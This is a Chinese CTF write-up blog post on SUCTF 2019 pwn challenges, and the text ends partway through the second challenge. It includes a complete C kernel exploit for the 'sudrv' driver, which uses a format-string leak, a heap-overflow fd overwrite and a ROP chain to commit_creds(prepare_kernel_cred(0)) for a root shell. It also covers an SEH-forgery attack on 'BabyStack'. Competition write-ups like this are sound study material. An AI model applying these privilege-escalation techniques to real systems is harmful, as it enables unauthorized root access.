<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="referrer" content="no-referrer" />
    <meta name="description" content="My Solve in this GAME: 0x01 sudrv qemu: 1234567891011#! &#x2F;bin&#x2F;shqemu-system-x86_64 \-m 128M \-kernel .&#x2F;bzImage \-initrd  .&#x2F;rootfs.cpio \-append &quot;root&#x3D;&#x2F;dev&#x2F;ram rw">
<meta property="og:type" content="article">
<meta property="og:title" content="SUCTF 2019 PWN">
<meta property="og:url" content="http://yoursite.com/2019/08/19/SUCTF-2019-PWN/index.html">
<meta property="og:site_name" content="Kirin&#39;s Blog">
<meta property="og:description" content="My Solve in this GAME: 0x01 sudrv qemu: 1234567891011#! &#x2F;bin&#x2F;shqemu-system-x86_64 \-m 128M \-kernel .&#x2F;bzImage \-initrd  .&#x2F;rootfs.cpio \-append &quot;root&#x3D;&#x2F;dev&#x2F;ram rw">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/7434375-22f7b666b2a65e98.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/7434375-fcb4d1f6931fe7ff.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="article:published_time" content="2019-08-19T13:18:12.000Z">
<meta property="article:modified_time" content="2019-08-20T05:33:12.000Z">
<meta property="article:author" content="Kirin">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/7434375-22f7b666b2a65e98.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
    
    
        
          
              <link rel="shortcut icon" href="/images/logo.jpg">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/logo.jpg" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.jpg">
          
        
    
    <!-- title -->
    <title>SUCTF 2019 PWN</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
<meta name="generator" content="Hexo 4.2.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2019/09/25/Some-PWN-in-KCTF-Q3-Bytes-CTF/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2019/08/06/De1CTF-2019-PWN/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/08/19/SUCTF-2019-PWN/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/08/19/SUCTF-2019-PWN/&text=SUCTF 2019 PWN" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/08/19/SUCTF-2019-PWN/&title=SUCTF 2019 PWN" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/08/19/SUCTF-2019-PWN/&is_video=false&description=SUCTF 2019 PWN" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=SUCTF 2019 PWN&body=Check out this article: http://yoursite.com/2019/08/19/SUCTF-2019-PWN/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/08/19/SUCTF-2019-PWN/&title=SUCTF 2019 PWN" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/08/19/SUCTF-2019-PWN/&title=SUCTF 2019 PWN" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/08/19/SUCTF-2019-PWN/&title=SUCTF 2019 PWN" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/08/19/SUCTF-2019-PWN/&title=SUCTF 2019 PWN" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/08/19/SUCTF-2019-PWN/&name=SUCTF 2019 PWN&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-sudrv"><span class="toc-number">1.</span> <span class="toc-text">0x01 sudrv</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-BabyStack"><span class="toc-number">2.</span> <span class="toc-text">0x02 BabyStack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-playfmt"><span class="toc-number">3.</span> <span class="toc-text">0x03 playfmt</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-二手破电脑"><span class="toc-number">4.</span> <span class="toc-text">0x04 二手破电脑</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        SUCTF 2019 PWN
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Kirin's Blog</span>
      </span>
      
    <div class="postdate">
        <time datetime="2019-08-19T13:18:12.000Z" itemprop="datePublished">2019-08-19</time>
    </div>


      

      

    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <p><img src="https://upload-images.jianshu.io/upload_images/7434375-22f7b666b2a65e98.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Venom"><br><strong>My Solve in this GAME:</strong></p>
<h2 id="0x01-sudrv"><a href="#0x01-sudrv" class="headerlink" title="0x01 sudrv"></a>0x01 sudrv</h2><p> qemu:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#! &#x2F;bin&#x2F;sh</span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 128M \</span><br><span class="line">-kernel .&#x2F;bzImage \</span><br><span class="line">-initrd  .&#x2F;rootfs.cpio \</span><br><span class="line">-append &quot;root&#x3D;&#x2F;dev&#x2F;ram rw console&#x3D;ttyS0 oops&#x3D;panic panic&#x3D;1 kaslr&quot; \</span><br><span class="line">-monitor &#x2F;dev&#x2F;null \</span><br><span class="line">-nographic 2&gt;&#x2F;dev&#x2F;null \</span><br><span class="line">-smp cores&#x3D;2,threads&#x3D;1 \</span><br><span class="line">-cpu kvm64,+smep</span><br></pre></td></tr></table></figure>
<p>开启了kalsr和smep保护<br>init:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;sh</span><br><span class="line">mkdir &#x2F;tmp</span><br><span class="line">mount -t proc none &#x2F;proc</span><br><span class="line">mount -t sysfs none &#x2F;sys</span><br><span class="line">mount -t debugfs none &#x2F;sys&#x2F;kernel&#x2F;debug</span><br><span class="line">mount -t tmpfs none &#x2F;tmp</span><br><span class="line">mknod -m 622 console c 5 1</span><br><span class="line">mknod -m 622 tty0 c 4 0</span><br><span class="line">insmod sudrv.ko</span><br><span class="line">mknod &#x2F;dev&#x2F;meizijiutql c 233 0</span><br><span class="line">chmod 666 &#x2F;dev&#x2F;meizijiutql</span><br><span class="line">mdev -s</span><br><span class="line">sysctl kernel.dmesg_restrict&#x3D;0</span><br><span class="line"># echo &quot;7 7 7 7&quot; &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;printk</span><br><span class="line">setsid &#x2F;bin&#x2F;cttyhack setuidgid 1000 &#x2F;bin&#x2F;sh</span><br><span class="line"># &#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure>
<p>内核会加载驱动sudrv.ko，且printk会输出至控制台<br>很显然驱动里有两处漏洞：<br>格式化字符串:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text.unlikely:00000000000000B8 sudrv_ioctl_cold_2 proc near            ; CODE XREF: sudrv_ioctl+62↑j</span><br><span class="line">.text.unlikely:00000000000000B8                 call    printk          ; PIC mode</span><br><span class="line">.text.unlikely:00000000000000BD</span><br><span class="line">.text.unlikely:00000000000000BD loc_BD:</span><br></pre></td></tr></table></figure>
<p>堆溢出</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000000000 sudrv_write     proc near</span><br><span class="line">.text:0000000000000000                 mov     rdi, cs:su_buf</span><br><span class="line">.text:0000000000000007                 call    copy_user_generic_unrolled ; PIC mode</span><br><span class="line">.text:000000000000000C                 test    eax, eax</span><br><span class="line">.text:000000000000000E                 jz      sudrv_write_cold_1</span><br><span class="line">.text:0000000000000014                 mov     rax, 0FFFFFFFFFFFFFFFFh</span><br><span class="line">.text:000000000000001B                 retn&lt;&#x2F;pre&gt;</span><br></pre></td></tr></table></figure>
<p><strong>起初我想的是堆喷分配大量cred到buf附近完成提权<br>但是cred分配时候使用的是cred_jar,与kmalloc分配的地址不同<br>没有办法直接覆盖<br>而后想了第二个思路：kmalloc(0x100)分配地址里很容易在&amp;heap+0x80处存在一个cred固定偏移的地址，可以先利用printk leak这个地址，而后类似利用fastbin attack，利用堆溢出将下一个堆的fd指向预测的cred地址完成提权，不过由于比较随机，只在本地成功过几次<br>而后就是第三个思路，比较稳定：相邻内核操作之间栈地址偏移固定，可以先用格式化字符串漏洞leak一个栈地址，并leak出内核加载基址，而后利用堆溢出覆盖FD分配堆到write的返回地址，在write的时候构造rop链覆盖自己的返回地址来调用commit_creds(prepare_kernel_cred(0)）完成提权，而后返回用户态get shell，起初一直ireq回用户态总是会在返回时运行一步即会crash，而后选择sysret成功返回用户态，不过直接返回到system运行几步会crash(和ireq时不同，这里可以正常运行一段)，选择使用signal(SIGSEGV, shellcode)，并在sysret时候设置rcx为0来使rip=0造成段错误来最后get shell(ireq回用户态出现crash时用signal也可以最后成功)。</strong><br><strong>My EXP:</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//第三种思路</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pty.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERNCALL __attribute__((regparm(3)))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> ( * commit_creds )(<span class="keyword">void</span> *) KERNCALL ;</span><br><span class="line"><span class="keyword">size_t</span>* (* prepare_kernel_cred)(<span class="keyword">void</span> *) KERNCALL ;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">int</span> magic1;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">int</span> magic2;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shellcode</span><span class="params">()</span></span>&#123; </span><br><span class="line">    system(<span class="string">"/bin/sh"</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">new</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">int</span> <span class="built_in">size</span>)</span></span>&#123;</span><br><span class="line">     ioctl(fd,<span class="number">0x73311337</span>,<span class="built_in">size</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span>  <span class="title">out</span><span class="params">(<span class="keyword">int</span> fd)</span></span>&#123;</span><br><span class="line">      ioctl(fd,<span class="number">0xdeadbeef</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span>  <span class="title">delete</span><span class="params">(<span class="keyword">int</span> fd)</span></span>&#123;</span><br><span class="line">    ioctl(fd,<span class="number">0x13377331</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getroot</span><span class="params">()</span></span>&#123;</span><br><span class="line">	commit_creds= magic2+<span class="number">0xffffffff81081790</span><span class="number">-0xffffffff811c827f</span>;</span><br><span class="line">	prepare_kernel_cred =magic2+<span class="number">0xffffffff81081410</span><span class="number">-0xffffffff811c827f</span>;	</span><br><span class="line">	<span class="keyword">size_t</span> cred = prepare_kernel_cred(<span class="number">0</span>);</span><br><span class="line">	commit_creds(cred);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_cs, user_ss, user_eflags,user_sp	;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">asm</span>(</span><br><span class="line">		<span class="string">"movq %%cs, %0\n"</span></span><br><span class="line">		<span class="string">"movq %%ss, %1\n"</span></span><br><span class="line">		<span class="string">"movq %%rsp, %3\n"</span></span><br><span class="line">		<span class="string">"pushfq\n"</span></span><br><span class="line">		<span class="string">"popq %2\n"</span></span><br><span class="line">		:<span class="string">"=r"</span>(user_cs), <span class="string">"=r"</span>(user_ss), <span class="string">"=r"</span>(user_eflags),<span class="string">"=r"</span>(user_sp)</span><br><span class="line"> 		:</span><br><span class="line"> 		: <span class="string">"memory"</span></span><br><span class="line"> 	);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">   save_status();</span><br><span class="line">   signal(SIGSEGV, shellcode);</span><br><span class="line">   <span class="keyword">long</span> <span class="keyword">int</span> buf[<span class="number">0x2000</span>];</span><br><span class="line">   <span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">   <span class="keyword">int</span> fd=<span class="built_in">open</span>(<span class="string">"/dev/meizijiutql"</span>,<span class="number">1</span>);</span><br><span class="line">   <span class="keyword">new</span>(fd,<span class="number">0x100</span>);</span><br><span class="line">   <span class="built_in">write</span>(fd,<span class="string">"%llx %llx %llx %llx %llx %llx %llx %llx %llx %llx %llx %llx "</span>,<span class="number">100</span>);</span><br><span class="line">   out(fd);</span><br><span class="line">   out(fd);</span><br><span class="line"><span class="comment">//0xffffc9000018bed8</span></span><br><span class="line"><span class="comment">//0xffffc9000018be50</span></span><br><span class="line"><span class="comment">//please input stack_addr &amp;&amp; kernel_addr leaked</span></span><br><span class="line">   <span class="built_in">scanf</span>(<span class="string">"%lx %lx"</span>,&amp;magic1,&amp;magic2);</span><br><span class="line">   buf[<span class="number">30</span>]=<span class="number">0x800000</span>;</span><br><span class="line">   buf[<span class="number">31</span>]=<span class="number">0xffffffffffffffff</span>;</span><br><span class="line">   buf[<span class="number">32</span>]=magic1<span class="number">-0x88</span>;</span><br><span class="line">   <span class="keyword">new</span>(fd,<span class="number">0x100</span>);</span><br><span class="line">   <span class="built_in">write</span>(fd,buf,<span class="number">0x120</span>);</span><br><span class="line">   <span class="keyword">new</span>(fd,<span class="number">0x100</span>);</span><br><span class="line">   <span class="keyword">new</span>(fd,<span class="number">0x100</span>);</span><br><span class="line">   buf[<span class="number">0</span>]=magic2+<span class="number">0xffffffff81001388</span><span class="number">-0xffffffff811c827f</span>;<span class="comment">//commit_creds(prepare_kernel_cred(0)）</span></span><br><span class="line">   buf[<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">   buf[<span class="number">2</span>]=magic2+<span class="number">0xffffffff81081790</span><span class="number">-0xffffffff811c827f</span>;</span><br><span class="line">   buf[<span class="number">3</span>]=magic2+<span class="number">0xffffffff819e2959</span><span class="number">-0xffffffff811c827f</span>;</span><br><span class="line">   buf[<span class="number">4</span>]=magic2+<span class="number">0xffffffff81081410</span><span class="number">-0xffffffff811c827f</span>;</span><br><span class="line">   buf[<span class="number">5</span>]=buf[<span class="number">0</span>];</span><br><span class="line">   buf[<span class="number">6</span>]=<span class="number">0x6f0</span>;</span><br><span class="line">   buf[<span class="number">7</span>]=magic2+<span class="number">0xffffffff8104e5b1</span><span class="number">-0xffffffff811c827f</span>;<span class="comment">//close smep(useless)</span></span><br><span class="line">   buf[<span class="number">8</span>]=magic2+<span class="number">0xffffffff810674ff</span><span class="number">-0xffffffff811c827f</span>;<span class="comment">//set rcx=0</span></span><br><span class="line">   buf[<span class="number">9</span>]=<span class="number">0</span>;</span><br><span class="line">   buf[<span class="number">10</span>]=magic2+<span class="number">0xffffffff81a000e1</span><span class="number">-0xffffffff811c827f</span>;<span class="comment">//pop...pop...swapgs;sysret</span></span><br><span class="line">   buf[<span class="number">11</span>]=<span class="number">0</span>;</span><br><span class="line">   buf[<span class="number">12</span>]=<span class="number">1</span>;</span><br><span class="line">   buf[<span class="number">13</span>]=user_sp;</span><br><span class="line">   buf[<span class="number">14</span>]=<span class="number">0x401c60</span>;</span><br><span class="line">   buf[<span class="number">15</span>]=user_sp;</span><br><span class="line">   buf[<span class="number">16</span>]=<span class="number">0x400418</span>;</span><br><span class="line">   buf[<span class="number">17</span>]=user_eflags;</span><br><span class="line">   buf[<span class="number">18</span>]=shellcode;</span><br><span class="line">   buf[<span class="number">19</span>]=<span class="number">0x6d7f98</span>;</span><br><span class="line">   buf[<span class="number">20</span>]=shellcode;</span><br><span class="line">   buf[<span class="number">21</span>]=shellcode;</span><br><span class="line">   buf[<span class="number">22</span>]=<span class="number">0x100</span>;</span><br><span class="line">   buf[<span class="number">23</span>]=<span class="number">0x73311337</span>;</span><br><span class="line">   buf[<span class="number">24</span>]=<span class="number">1</span>;</span><br><span class="line">   buf[<span class="number">25</span>]=user_sp;</span><br><span class="line">   buf[<span class="number">26</span>]=<span class="number">7</span>;</span><br><span class="line">   buf[<span class="number">27</span>]=shellcode;</span><br><span class="line">   buf[<span class="number">28</span>]=user_cs;</span><br><span class="line">   buf[<span class="number">29</span>]=user_eflags;</span><br><span class="line">   buf[<span class="number">30</span>]=user_sp;</span><br><span class="line">   buf[<span class="number">31</span>]=user_ss;</span><br><span class="line">   <span class="built_in">write</span>(fd,buf,<span class="number">280</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc ./exp.c -o exp --static</span></span><br></pre></td></tr></table></figure>
<p><img src="https://upload-images.jianshu.io/upload_images/7434375-fcb4d1f6931fe7ff.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="PWN"></p>
<h2 id="0x02-BabyStack"><a href="#0x02-BabyStack" class="headerlink" title="0x02 BabyStack"></a>0x02 BabyStack</h2><p>首先注意到主程序会decode hex，而后：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> .text:00BA854C                 call    loc_BA8552</span><br><span class="line">.text:00BA854C ; </span><br><span class="line">.text:00BA8552 loc_BA8552:                             ; CODE XREF: sub_BA83E0:loc_BA854C↑j</span><br><span class="line">.text:00BA8552                 pop     eax</span><br><span class="line">.text:00BA8553                 mov     esi, [ebp+var_2C]</span><br><span class="line">.text:00BA8556                 sub     esi, eax</span><br><span class="line">.text:00BA8558                 div     esi</span><br></pre></td></tr></table></figure>
<p>当造成除零错误即会根据 CPPEH_RECORD结构体转去执行：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.rdata:00C1ACE0 stru_C1ACE0     dd 0FFFFFFE4h           ; GSCookieOffset</span><br><span class="line">.rdata:00C1ACE0                                         ; DATA XREF: sub_BA83E0+5↑o</span><br><span class="line">.rdata:00C1ACE0                 dd 0                    ; GSCookieXOROffset ; SEH scope table for function 4083E0</span><br><span class="line">.rdata:00C1ACE0                 dd 0FFFFFFC0h           ; EHCookieOffset</span><br><span class="line">.rdata:00C1ACE0                 dd 0                    ; EHCookieXOROffset</span><br><span class="line">.rdata:00C1ACE0                 dd 0FFFFFFFEh           ; ScopeRecord.EnclosingLevel</span><br><span class="line">.rdata:00C1ACE0                 dd offset loc_BA8583    ; ScopeRecord.FilterFunc</span><br><span class="line">.rdata:00C1ACE0                 dd offset loc_BA8589    ; ScopeRecord.HandlerFunc</span><br></pre></td></tr></table></figure>
<p>中的函数<br>而后就有了几次任意地址读且栈溢的机会，因此直接在任意地址读时读取伪造CPPEH_RECORD需要的其他信息(cookie等)，而后伪造CPPEH_RECORD中ScopeTable^<strong><em>security_cookie指向我们在栈中伪造的结构体(同时注意在栈中绕过</em></strong>security_cookie检查)，而后即可在任意地址读时读一个非法地址造成错误转而指向<br>我们伪造结构体中的函数，注意到有一处：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:00DE8266                 push    offset aTypeFlagTxt ; &quot;type flag.txt&quot;</span><br><span class="line">.text:00DE826B                 call    system</span><br><span class="line">.text:00DE8270                 add     esp, 4</span><br></pre></td></tr></table></figure>
<p>指向此即可最后get flag<br>PS:我的调试方法：在windows端socat一个cmd，而后linux端连接，输入./BabyStack.exe，而后pwntools交互，在windows端attach即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span 